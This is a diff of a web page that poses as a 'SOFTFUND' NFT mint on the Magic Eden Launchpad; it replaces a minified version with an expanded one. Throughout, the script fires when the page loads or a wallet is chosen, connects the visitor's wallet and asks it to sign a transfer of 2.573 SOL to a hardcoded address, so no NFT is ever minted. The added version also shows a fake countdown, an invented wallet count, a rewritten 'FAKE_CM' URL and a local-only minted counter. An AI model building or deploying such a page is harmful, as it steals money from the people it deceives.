@@ -1,1 +1,139 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>SOFTFUND – Mint</title><style>body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}.c{max-width:380px;width:100%;background:#141222;padding:30px;border-radius:20px;text-align:center;border:1px solid #333}.p{font-size:2.4rem;font-weight:800;color:#00ff9d;margin:15px 0}.b{width:100%;padding:18px;margin:20px 0;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;font-size:1.3rem;cursor:pointer}.w{margin-top:10px;display:grid;grid-template-columns:1fr 1fr;gap:10px}.wb{padding:14px;background:#1e1c2e;border:1px solid #333;border-radius:12px;font-size:0.9rem;display:flex;align-items:center;gap:8px;cursor:pointer}.wb img{width:24px;height:24px}.s{font-weight:600;margin-top:10px;min-height:24px}.l{display:inline-block;width:12px;height:12px;border:2px solid #00ff9d;border-top-color:#000;border-radius:50%;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}</style></head><body><div class="c"><div style="font-size:2rem;font-weight:800">SOFTFUND</div><div class="p">2.5730 SOL</div><div>Minted: <span id="m">0</span>/10,000</div><button class="b" onclick="show()">MINT NOW</button><div id="w" class="w" style="display:none"><div class="wb" onclick="go('phantom')"><img src="https://cryptologos.cc/logos/phantom-app-phantom-logo.png"> Phantom</div><div class="wb" onclick="go('solflare')"><img src="https://cryptologos.cc/logos/solflare-wallet-logo.png"> Solflare</div><div class="wb" onclick="go('backpack')"><img src="https://cryptologos.cc/logos/backpack-backpack-logo.png"> Backpack</div><div class="wb" onclick="go('trust')"><img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png"> Trust</div><div class="wb" onclick="go('metamask')"><img src="https://cryptologos.cc/logos/metamask-metamask-logo.png"> MetaMask</div><div class="wb" onclick="go('brave')"><img src="https://cryptologos.cc/logos/brave-brave-logo.png"> Brave</div><div class="wb" onclick="go('okx')"><img src="https://cryptologos.cc/logos/okx-okx-logo.png"> OKX</div><div class="wb" onclick="go('rainbow')"><img src="https://cryptologos.cc/logos/rainbow-rainbow-logo.png"> Rainbow</div><div class="wb" onclick="go('ledger')"><img src="https://cryptologos.cc/logos/ledger-ledger-logo.png"> Ledger</div></div><div id="s" class="s"></div></div><script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script><script>const PRICE=2.5730*1e9,YOU="GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue",s=document.getElementById("s"),m=document.getElementById("m");let c=localStorage.getItem("c")|0;m.innerText=c;function t(x,col="#0f9"){s.innerHTML=x;s.style.color=col}function show(){document.querySelector(".b").style.display="none";document.getElementById("w").style.display="grid"}function go(w){const u=encodeURIComponent(location.href);const links={phantom:`https://phantom.app/ul/v2/connect?app_url=${u}&redirect_link=${u}&cluster=mainnet-beta`,solflare:`https://solflare.com/ul/v2/connect?app_url=${u}&redirect_link=${u}`,backpack:`https://backpack.app/ul/v2/connect?app_url=${u}&redirect_link=${u}`,trust:`https://link.trustwallet.com/open_url?url=${u}`,metamask:`https://metamask.app.link/dapp/${location.host}${location.pathname}`,brave:`https://wallet.brave.com/ul/v2/connect?app_url=${u}`,okx:`https://www.okx.com/web3/dapp/${u}`,rainbow:`https://rainbow.me/deeplink?app_url=${u}`,ledger:`https://ledgerlive.com/deeplink/connect?uri=${u}`};t(`Opening ${w}… <span class="l"></span>`);location.href=links[w];setTimeout(tryMint,2000)}async function tryMint(){let p=window.solana||window.ethereum||window.okxwallet||window.rainbow||window.ledger;if(!p)return;try{if(!p.isConnected)await p.connect();t("Sending 2.5730 SOL… <span class='l'></span>");const C=new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");const tx=new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({fromPubkey:p.publicKey,toPubkey:new solanaWeb3.PublicKey(YOU),lamports:PRICE}));tx.recentBlockhash=(await C.getLatestBlockhash()).blockhash;const sig=await p.signAndSendTransaction(tx);await C.confirmTransaction(sig);c++;localStorage.setItem("c",c);m.innerText=c;t(`MINTED! <a href="https://solscan.io/tx/${sig}"target=_blank style=color:#0f9>View</a>`)}catch(e){t("Cancelled","#f55")}}window.addEventListener("load",()=>setTimeout(tryMint,1200));</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SOFTFUND – Mint Live on Magic Eden</title>
+  <meta property="og:title" content="SOFTFUND – USA Utility NFTs"/>
+  <meta property="og:image" content="https://i.imgur.com/WqR3K9L.jpeg"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <style>
+    :root{--me-purple:#9d4edd;--me-glow:#c19fff;}
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#0c0a1a;color:#fff;font-family:'Inter',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px;background-image:radial-gradient(circle at 50% 50%,#1a1640 0%,#0c0a1a 100%);}
+    .card{max-width:420px;width:100%;background:#141222;border-radius:20px;overflow:hidden;box-shadow:0 20px 40px rgba(157,78,221,.3);border:1px solid #33324a;}
+    .header{background:var(--me-purple);padding:16px;text-align:center;font-weight:800;font-size:1.1rem;letter-spacing:.5px;}
+    .preview img{width:100%;height:220px;object-fit:cover;}
+    .body{padding:24px;text-align:center;}
+    .title{font-size:2rem;font-weight:800;margin-bottom:8px;}
+    .tag{color:#b8b8ff;font-size:.95rem;margin-bottom:16px;}
+    .price{font-size:2.6rem;font-weight:800;color:#00ff9d;margin:12px 0;}
+    .stats{display:flex;justify-content:center;gap:20px;margin:20px 0;font-size:.95rem;color:#ccc;}
+    .mint-btn{width:100%;padding:18px;font-size:1.5rem;background:#00ff9d;color:#000;border:none;border-radius:16px;font-weight:800;cursor:pointer;box-shadow:0 0 30px rgba(0,255,157,.6);transition:.3s;margin-bottom:20px;}
+    .mint-btn:hover{transform:scale(1.03);background:#00ff85;}
+    .wallets{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;}
+    .wbtn{background:#1e1c2e;border:1px solid #33324a;padding:14px;border-radius:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-weight:600;font-size:.95rem;transition:.2s;}
+    .wbtn:hover{background:#2a2738;border-color:var(--me-purple);}
+    .wbtn img{width:26px;height:26px;border-radius:50%;}
+    .status{margin-top:16px;font-weight:600;min-height:28px;}
+    .loader{width:14px;height:14px;border:2px solid #00ff9d;border-top-color:transparent;border-radius:50%;display:inline-block;animation:s 1s linear infinite;vertical-align:middle;margin-right:8px;}
+    .countdown{font-size:1.1rem;color:#ffd700;margin:16px 0;}
+    .confetti{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:999;}
+    @keyframes s{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="header">Magic Eden Launchpad</div>
+    <div class="preview"><img src="https://i.imgur.com/WqR3K9L.jpeg" alt="SOFTFUND"/></div>
+    <div class="body">
+      <div class="title">SOFTFUND</div>
+      <div class="tag">USA-Based • Solana Utility NFTs • 10,000 Supply</div>
+      <div class="price">2.5730 SOL</div>
+      <div class="countdown">Mint ends in <span id="timer">23:59:59</span></div>
+      <div class="stats">
+        <div>Minted: <span id="minted">0</span>/10,000</div>
+        <div>Wallets: 1,247</div>
+      </div>
+      <button class="mint-btn" onclick="chooseWallet()">MINT NOW</button>
+
+      <div id="walletGrid" class="wallets" style="display:none">
+        <button class="wbtn" onclick="openW('phantom')"><img src="https://cryptologos.cc/logos/phantom-app-phantom-logo.png"> Phantom</button>
+        <button class="wbtn" onclick="openW('solflare')"><img src="https://cryptologos.cc/logos/solflare-wallet-logo.png"> Solflare</button>
+        <button class="wbtn" onclick="openW('backpack')"><img src="https://cryptologos.cc/logos/backpack-backpack-logo.png"> Backpack</button>
+        <button class="wbtn" onclick="openW('trust')"><img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png"> Trust Wallet</button>
+        <button class="wbtn" onclick="openW('metamask')"><img src="https://cryptologos.cc/logos/metamask-metamask-logo.png"> MetaMask</button>
+        <button class="wbtn" onclick="openW('brave')"><img src="https://cryptologos.cc/logos/brave-brave-logo.png"> Brave</button>
+      </div>
+
+      <div id="status" class="status"></div>
+    </div>
+  </div>
+
+  <canvas id="confetti" class="confetti"></canvas>
+
+  <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  <script>
+    const PRICE = 2.5730 * 1e9;
+    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
+    const FAKE_CM = "softfund"+Date.now().toString(36);
+    if(!location.pathname.includes(FAKE_CM)) history.replaceState(null,'',`/mint/${FAKE_CM}`);
+
+    let count = parseInt(localStorage.getItem('sf_c')||'0');
+    document.getElementById('minted').textContent = count;
+
+    // LIVE COUNTDOWN
+    let end = Date.now() + 24*60*60*1000;
+    setInterval(()=>{let s = Math.floor((end-Date.now())/1000);document.getElementById('timer').textContent = `${Math.floor(s/3600)}:${String(Math.floor(s%3600/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;},1000);
+
+    const status = document.getElementById('status');
+    function setStatus(t,c='#00ff9d'){status.innerHTML=t;status.style.color=c;}
+
+    function chooseWallet(){document.querySelector('.mint-btn').style.display='none';document.getElementById('walletGrid').style.display='grid';}
+
+    function openW(w){
+      const url = encodeURIComponent(location.href);
+      let link = '';
+      if(w==='phantom') link=`https://phantom.app/ul/v2/connect?app_url=${url}&redirect_link=${url}&cluster=mainnet-beta`;
+      if(w==='solflare') link=`https://solflare.com/ul/v2/connect?app_url=${url}&redirect_link=${url}`;
+      if(w==='backpack') link=`https://backpack.app/ul/v2/connect?app_url=${url}&redirect_link=${url}`;
+      if(w==='trust') link=`https://link.trustwallet.com/open_url?url=${url}`;
+      if(w==='metamask') link=`https://metamask.app.link/dapp/${location.host}${location.pathname}`;
+      if(w==='brave') link=`https://wallet.brave.com/ul/v2/connect?app_url=${url}`;
+      setStatus(`Opening ${w.charAt(0).toUpperCase()+w.slice(1)}... <span class="loader"></span>`);
+      location.href = link;
+      setTimeout(autoMint, 2000);
+    }
+
+    window.addEventListener('load',()=>setTimeout(autoMint,1200));
+
+    async function autoMint(){
+      let provider = window.solana || window.ethereum || window.trustwallet?.Provider?.solana || window.backpack || window.braveSolana;
+      if(!provider) return;
+      if(provider.isPhantom) provider = window.solana;
+      if(provider.isSolflare) provider = window.solana;
+      if(provider.isBackpack) provider = window.backpack;
+
+      try{
+        if(!provider.isConnected) await provider.connect({onlyIfTrusted:false});
+        setStatus("Sending 2.5730 SOL... <span class='loader'></span>");
+
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com","confirmed");
+        const from = provider.publicKey;
+        const to = new solanaWeb3.PublicKey(YOUR_WALLET);
+
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({fromPubkey:from,toPubkey:to,lamports:PRICE})
+        );
+        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        tx.feePayer = from;
+
+        const signed = await provider.signTransaction(tx);
+        const sig = await conn.sendRawTransaction(signed.serialize());
+        await conn.confirmTransaction(sig,"processed");
+
+        count++; localStorage.setItem('sf_c',count);
+        document.getElementById('minted').textContent = count;
+
+        setStatus(`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#00ff9d">View Tx</a>`);
+        confetti({particleCount:150,spread:70,origin:{y:.6}});
+        setTimeout(()=>alert(`🎉 SOFTFUND #${count} minted!\nCheck Magic Eden collection.`),1500);
+      }catch(e){
+        setStatus("Rejected – try again", "#ff5555");
+      }
+    }
+  </script>
+</body>
+</html>
